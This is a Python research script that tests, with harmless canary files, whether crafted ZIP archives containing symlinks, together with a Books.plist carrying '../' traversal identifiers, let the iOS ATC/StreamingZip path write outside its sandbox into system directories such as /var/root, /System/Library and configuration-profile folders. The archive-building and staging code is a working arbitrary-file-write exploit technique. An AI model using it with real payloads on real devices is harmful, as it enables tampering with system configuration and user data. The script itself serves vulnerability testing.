#!/usr/bin/env python3
"""Probe ATC + StreamingZip escaped-directory write authority with canaries."""

from __future__ import annotations

import asyncio
import hashlib
import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import tempfile
import zipfile
from pathlib import Path
from typing import Any

import chain_canary as chain


AIRLOCK_BOOK_ROOT = "/var/mobile/Media/Airlock/Book"
MEDIA_ROOT = "/var/mobile/Media"
MATRIX_TARGETS = (
    ("mobile-media-control", "/var/mobile/Media/Books"),
    ("mobile-library", "/var/mobile/Library"),
    ("mobile-library-preferences", "/var/mobile/Library/Preferences"),
    ("mobile-library-caches", "/var/mobile/Library/Caches"),
    ("mobile-library-springboard", "/var/mobile/Library/SpringBoard"),
    (
        "mobile-library-configuration-profiles",
        "/var/mobile/Library/ConfigurationProfiles",
    ),
    (
        "mobile-library-managed-preferences",
        "/var/mobile/Library/Managed Preferences/mobile",
    ),
    (
        "mobile-library-user-configuration-profiles",
        "/var/mobile/Library/UserConfigurationProfiles",
    ),
    ("mobile-library-logs", "/var/mobile/Library/Logs"),
    ("mobile-documents", "/var/mobile/Documents"),
    ("mobile-containers", "/var/mobile/Containers"),
    ("mobile-app-containers", "/var/mobile/Containers/Data/Application"),
    ("mobile-system-data-containers", "/var/mobile/Containers/Data/System"),
    ("mobile-app-groups", "/var/mobile/Containers/Shared/AppGroup"),
    ("private-mobile-preferences-alias", "/private/var/mobile/Library/Preferences"),
    ("var-tmp", "/var/tmp"),
    ("var-db", "/var/db"),
    ("var-root", "/var/root"),
    ("var-containers", "/var/containers"),
    ("var-bundle-applications", "/var/containers/Bundle/Application"),
    ("var-system-data-containers", "/var/containers/Data/System"),
    ("var-shared-system-groups", "/var/containers/Shared/SystemGroup"),
    (
        "var-mobilegestalt-system-group-caches-fresh-leaf",
        "/var/containers/Shared/SystemGroup/"
        "systemgroup.com.apple.mobilegestaltcache/Library/Caches",
    ),
    ("library", "/Library"),
    ("library-preferences", "/Library/Preferences"),
    ("library-caches", "/Library/Caches"),
    ("private-containers", "/private/var/containers"),
    ("private-shared-system-groups", "/private/var/containers/Shared/SystemGroup"),
    (
        "mobilegestalt-system-group-caches-fresh-leaf",
        "/private/var/containers/Shared/SystemGroup/"
        "systemgroup.com.apple.mobilegestaltcache/Library/Caches",
    ),
    ("system-library", "/System/Library"),
    ("system-library-caches", "/System/Library/Caches"),
    ("tmp-alias", "/tmp"),
)

LIBRARY_EXPANSION_TARGETS = (
    ("library-accounts", "/var/mobile/Library/Accounts"),
    ("library-address-book", "/var/mobile/Library/AddressBook"),
    ("library-apple-media-services", "/var/mobile/Library/AppleMediaServices"),
    ("library-application-support", "/var/mobile/Library/Application Support"),
    ("library-assistant", "/var/mobile/Library/Assistant"),
    ("library-biome", "/var/mobile/Library/Biome"),
    ("library-bulletin-board", "/var/mobile/Library/BulletinBoard"),
    ("library-calendar", "/var/mobile/Library/Calendar"),
    ("library-call-history", "/var/mobile/Library/CallHistoryDB"),
    ("library-carrier-bundles", "/var/mobile/Library/Carrier Bundles"),
    ("library-cookies", "/var/mobile/Library/Cookies"),
    ("library-core-duet", "/var/mobile/Library/CoreDuet"),
    ("library-data-access", "/var/mobile/Library/DataAccess"),
    ("library-front-board", "/var/mobile/Library/FrontBoard"),
    ("library-health", "/var/mobile/Library/Health"),
    ("library-home-kit", "/var/mobile/Library/HomeKit"),
    ("library-identity-services", "/var/mobile/Library/IdentityServices"),
    ("library-keyboard", "/var/mobile/Library/Keyboard"),
    ("library-mail", "/var/mobile/Library/Mail"),
    ("library-mobile-installation", "/var/mobile/Library/MobileInstallation"),
    ("library-passes", "/var/mobile/Library/Passes"),
    ("library-photos", "/var/mobile/Library/Photos"),
    ("library-safari", "/var/mobile/Library/Safari"),
    ("library-sms", "/var/mobile/Library/SMS"),
    ("library-shortcuts", "/var/mobile/Library/Shortcuts"),
    ("library-spotlight", "/var/mobile/Library/Spotlight"),
    ("library-suggestions", "/var/mobile/Library/Suggestions"),
    ("library-trial", "/var/mobile/Library/Trial"),
    ("library-user-notifications", "/var/mobile/Library/UserNotifications"),
    ("library-web-clips", "/var/mobile/Library/WebClips"),
)


def build_matrix_archive(target_directory: str, payload: bytes) -> tuple[bytes, str]:
    if not target_directory.startswith("/") or target_directory == "/":
        raise ValueError("target must be a non-root absolute directory")
    target_tail = target_directory[1:].rstrip("/")
    components = target_tail.split("/")
    if any(component in ("", ".", "..") for component in components):
        raise ValueError("target contains an unsafe component")

    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(chain.zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(chain.zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in components:
            cursor = f"{cursor}{component}/"
            archive.writestr(chain.zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            chain.zip_info("payload", stat.S_IFREG | 0o600), payload
        )
    return output.getvalue(), target_tail


def cleanup_is_complete(operation: dict[str, Any]) -> bool:
    return bool(
        operation.get("safeArguments")
        and operation.get("cleanupFailureCount") == 0
        and operation.get("sourceMediaAbsent")
        and operation.get("linkAbsent")
        and operation.get("recoveredAbsent")
        and operation.get("booksFilesAbsent")
    )


async def preflight(udid: str) -> dict[str, Any]:
    result = await asyncio.to_thread(chain.run_mobiledevice_io, "probe-afc", udid)
    operation = result.get("operation", {})
    if not (
        result.get("targetGatePassed")
        and operation.get("ok")
        and not operation.get("booksSyncPlistPresent")
    ):
        raise RuntimeError("native target/Books preflight failed")
    return result


async def execute_attempt(
    udid: str,
    label: str,
    target_directory: str,
    target_leaf: str,
    payload: bytes,
    *,
    recovery_only: bool = False,
) -> dict[str, Any]:
    token = secrets.token_hex(8)
    source = f"codex-dir-src-24A435-{token}"
    link_destination = f"codex-dir-link-24A435-{token}"
    recovered = f"codex-dir-recovered-24A435-{token}"
    archive, target_tail = build_matrix_archive(target_directory, payload)
    link_identifier = f"../../{source}/p0/p1/p2/link"
    target_path = f"{target_directory.rstrip('/')}/{target_leaf}"
    target_identifier = posixpath.relpath(target_path, AIRLOCK_BOOK_ROOT)
    if recovery_only:
        books = chain.build_books_plist(link_identifier, target_identifier)
        second_identifier = target_identifier
        second_destination = recovered
    else:
        payload_identifier = f"../../{source}/payload"
        books = chain.build_books_plist(
            link_identifier, payload_identifier, target_identifier
        )
        second_identifier = payload_identifier
        second_destination = f"{link_destination}/{target_leaf}"

    result: dict[str, Any] = {
        "label": label,
        "targetDirectory": target_directory,
        "targetLeaf": target_leaf,
        "recoveryOnly": recovery_only,
        "payloadLength": len(payload),
        "payloadSHA256": hashlib.sha256(payload).hexdigest(),
        "archiveSHA256": hashlib.sha256(archive).hexdigest(),
        "booksSHA256": hashlib.sha256(books).hexdigest(),
    }
    staged = False
    with tempfile.TemporaryDirectory(prefix="atc-directory-matrix-") as work_dir:
        work = Path(work_dir)
        archive_path = work / "payload.zip"
        books_path = work / "Books.plist"
        expected_path = work / "expected.bin"
        archive_path.write_bytes(archive)
        books_path.write_bytes(books)
        expected_path.write_bytes(payload)
        try:
            result["preflight"] = await preflight(udid)
            result["stage"] = await asyncio.to_thread(
                chain.run_mobiledevice_io,
                "stage",
                udid,
                source,
                link_destination,
                recovered,
                os.fspath(archive_path),
                os.fspath(books_path),
            )
            staged = bool(
                result["stage"].get("targetGatePassed")
                and result["stage"].get("operation", {}).get("ok")
            )
            if not staged:
                raise RuntimeError("native staging failed")
            if recovery_only:
                result["atc"] = await asyncio.to_thread(
                    chain.run_atc_host,
                    udid,
                    link_identifier,
                    link_destination,
                    second_identifier,
                    second_destination,
                )
            else:
                result["atc"] = await asyncio.to_thread(
                    chain.run_atc_host,
                    udid,
                    link_identifier,
                    link_destination,
                    second_identifier,
                    second_destination,
                    target_identifier,
                    recovered,
                )
        except Exception as error:
            result["errorType"] = type(error).__name__
            result["error"] = chain.TRANSPORT.redact(error)
        finally:
            if staged or "stage" in result:
                result["verifyCleanup"] = await asyncio.to_thread(
                    chain.run_mobiledevice_io,
                    "verify-matrix-cleanup",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(expected_path),
                    target_tail,
                )

    operation = result.get("verifyCleanup", {}).get("operation", {})
    result["recoveredExactBytes"] = bool(
        operation.get("recoveredPresent")
        and operation.get("recoveredBytesMatch")
        and operation.get("observedLength") == len(payload)
    )
    result["cleanupComplete"] = cleanup_is_complete(operation)
    result["attemptComplete"] = bool(
        staged
        and result.get("atc", {}).get("ok")
        and result["cleanupComplete"]
    )
    return result


async def run_target(
    udid: str, label: str, target_directory: str
) -> tuple[dict[str, Any], bool]:
    target_leaf = f"com.codex.directory-canary-{secrets.token_hex(16)}.bin"
    payload = (
        f"codex escaped-directory canary\nbuild=24A435\nlabel={label}\n"
        f"nonce={secrets.token_hex(24)}\n"
    ).encode()
    primary = await execute_attempt(
        udid, label, target_directory, target_leaf, payload
    )
    result: dict[str, Any] = {
        "label": label,
        "targetDirectory": target_directory,
        "targetLeaf": target_leaf,
        "primary": primary,
    }
    if primary.get("recoveredExactBytes"):
        result["outcome"] = "write-and-exact-recovery-confirmed"
        result["residueAccountedFor"] = primary.get("cleanupComplete", False)
        return result, bool(result["residueAccountedFor"])

    recovery = await execute_attempt(
        udid,
        f"{label}-dedicated-recovery",
        target_directory,
        target_leaf,
        payload,
        recovery_only=True,
    )
    result["dedicatedRecovery"] = recovery
    if recovery.get("recoveredExactBytes"):
        result["outcome"] = "write-confirmed-recovered-on-dedicated-pass"
        result["residueAccountedFor"] = recovery.get("cleanupComplete", False)
    else:
        result["outcome"] = "no-write-observed"
        result["residueAccountedFor"] = bool(
            primary.get("cleanupComplete") and recovery.get("cleanupComplete")
        )
        result["residueCheck"] = "fresh dedicated recovery pass also found no canary"
    return result, bool(result["residueAccountedFor"])


async def main() -> int:
    udid = chain.TRANSPORT.paired_coredevice_udid()
    summary: dict[str, Any] = {
        "schema": 1,
        "test": "ATCStreamingZipEscapedDirectoryWriteMatrix",
        "expectedProduct": chain.EXPECTED_PRODUCT,
        "expectedVersion": chain.EXPECTED_VERSION,
        "expectedBuild": chain.EXPECTED_BUILD,
        "canonicalMobileGestaltCacheTouched": False,
        "existingFilesTargeted": False,
        "targets": [],
    }
    try:
        summary["initialPreflight"] = await preflight(udid)
        for index, (label, target_directory) in enumerate(MATRIX_TARGETS, 1):
            row, safe_to_continue = await run_target(udid, label, target_directory)
            summary["targets"].append(row)
            print(
                json.dumps(
                    {
                        "progress": f"{index}/{len(MATRIX_TARGETS)}",
                        "label": label,
                        "targetDirectory": target_directory,
                        "outcome": row["outcome"],
                        "residueAccountedFor": row["residueAccountedFor"],
                    },
                    sort_keys=True,
                ),
                flush=True,
            )
            if not safe_to_continue:
                summary["abortedAfter"] = label
                summary["abortReason"] = "generated artifacts were not fully accounted for"
                break
        summary["finalPreflight"] = await preflight(udid)
    except Exception as error:
        summary["errorType"] = type(error).__name__
        summary["error"] = chain.TRANSPORT.redact(error)

    rows = summary["targets"]
    summary["confirmedWriteDirectories"] = [
        row["targetDirectory"]
        for row in rows
        if row["outcome"].startswith("write-")
    ]
    summary["noWriteObservedDirectories"] = [
        row["targetDirectory"]
        for row in rows
        if row["outcome"] == "no-write-observed"
    ]
    summary["allGeneratedArtifactsAccountedFor"] = bool(
        rows
        and all(row.get("residueAccountedFor") for row in rows)
        and "abortedAfter" not in summary
    )
    summary["ok"] = bool(
        "error" not in summary
        and "abortedAfter" not in summary
        and summary["allGeneratedArtifactsAccountedFor"]
    )
    public_summary = {
        key: value
        for key, value in summary.items()
        if key not in ("targets", "initialPreflight", "finalPreflight")
    }
    public_summary["initialPreflightOK"] = bool(
        summary.get("initialPreflight", {}).get("operation", {}).get("ok")
    )
    public_summary["finalPreflightOK"] = bool(
        summary.get("finalPreflight", {}).get("operation", {}).get("ok")
    )
    public_summary["targets"] = [
        {
            "label": row["label"],
            "targetDirectory": row["targetDirectory"],
            "outcome": row["outcome"],
            "residueAccountedFor": row["residueAccountedFor"],
            "primaryRecoveredExactBytes": row["primary"].get(
                "recoveredExactBytes"
            ),
            "primaryCleanupComplete": row["primary"].get("cleanupComplete"),
            "dedicatedRecoveryExactBytes": row.get("dedicatedRecovery", {}).get(
                "recoveredExactBytes"
            ),
            "dedicatedRecoveryCleanupComplete": row.get(
                "dedicatedRecovery", {}
            ).get("cleanupComplete"),
        }
        for row in rows
    ]
    print(json.dumps({"final": public_summary}, sort_keys=True), flush=True)
    return 0 if summary["ok"] else 2


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
